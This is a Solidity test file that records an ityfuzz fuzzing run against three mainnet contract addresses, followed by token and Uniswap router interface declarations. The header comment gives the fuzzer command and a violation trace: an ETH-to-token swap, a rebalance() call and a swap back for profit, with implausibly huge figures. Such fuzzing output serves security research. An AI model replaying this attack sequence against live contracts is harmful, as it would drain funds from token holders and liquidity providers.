// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0xa29e4fe451ccfa5e7def35188919ad7077a4de8f,0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5,0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156 -c eth --onchain-block-number 15791484 -f -i -p --onchain-etherscan-api-key $ETH_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Earned 8907083787485861186428537308360608296405383435818504926112121639515153900476000000 more than owed 287724354996224149542146992000000, net earned = 8907083787485861186428537308360608296405383435818217201757125415365611753484000000wei (8907083787485861186428537308360608296405383435818217201757ETH)

================ Trace ================
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] Router.swapExactETHForTokens{value: 287724344.9962 Ether}(0, path:(WETH → 0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76), address(this), block.timestamp);
   ├─[1] 0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76.rebalance()
   │  ├─[2] [Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd.fallback()
   ├─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76 → WETH), address(this), block.timestamp);
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  ├─[2] Router.swapExactTokensForETH(100% Balance, 0, path:(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156 → WETH), address(this), block.timestamp);
   │  │  └─ ← ()


 */





interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
